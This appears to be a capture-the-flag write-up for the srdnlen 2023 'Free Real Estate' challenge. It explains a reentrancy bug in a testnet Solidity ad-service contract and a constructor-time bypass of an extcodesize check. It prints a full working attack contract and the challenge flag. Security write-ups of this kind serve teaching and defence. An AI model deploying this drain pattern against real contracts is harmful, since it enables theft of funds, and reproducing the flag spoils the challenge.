---
title: "srdnlen 2023 — Free Real Estate"
date: 2023-10-28
draft: false
tags: ["blockchain", "solidity", "reentrancy", "smart-contract"]
categories: ["srdnlen 2023"]
authors: ["Stefanoz45", "rickbonavigo"]
summary: "Re-entrancy attack on a Solidity smart contract — bypassing extcodesize checks and draining tokens from a fake ad service."
---

## Introduction

In this challenge, we are given a Solidity smart-contract deployed on the Sepolia Testnet. The contract simulates an "ad service" where users can register and buy ads. Upon signup, each user receives 10 "freebies" which can be converted to account money. To get the flag, we need to buy an ad — but that requires over 100 tokens.

## Finding the vulnerability

The `redeem` function has a classic re-entrancy bug: it makes an external call **before** updating state:

```solidity
function redeem(int256 tickets) public payable {
    require(freebies[msg.sender] >= tickets);
    // External call BEFORE state update!
    (bool status, ) = payable(msg.sender).call{value:msg.value}("returnWallet");
    require(status);
    freebies[msg.sender] -= tickets;  // Too late!
    accounts[msg.sender] += tickets;
}
```

## Bypassing `isNotContract`

The `createAccount` function uses `extcodesize` to block contracts. But during constructor execution, `extcodesize` returns zero — so we call `createAccount()` from our constructor:

```solidity
constructor (address _a) public {
    c = IFreeRealEstate(_a);
    c.createAccount();  // extcodesize == 0 during construction!
    count = 0;
}
```

## The attack contract

```solidity
contract AttackContract {
    int public count;
    IFreeRealEstate c;

    constructor (address _a) public {
        c = IFreeRealEstate(_a);
        c.createAccount();
        count = 0;
    }

    function attack() public {
        c.redeem(10);
    }

    function buy(string memory pd) public {
        c.buyAdSpace(pd);
    }

    fallback() external payable {
        if (count < 10) {
            count += 1;
            c.redeem(10);  // Re-entrancy: 10 calls × 10 tokens = 100!
        }
    }
}
```

After deploying to Sepolia and running the re-entrancy attack, we earned 100 tokens, bought the ad, and received the flag.

**Flag:** `srdnlen{all_my_precious_monkes_gone_95b73faa9203447e}`
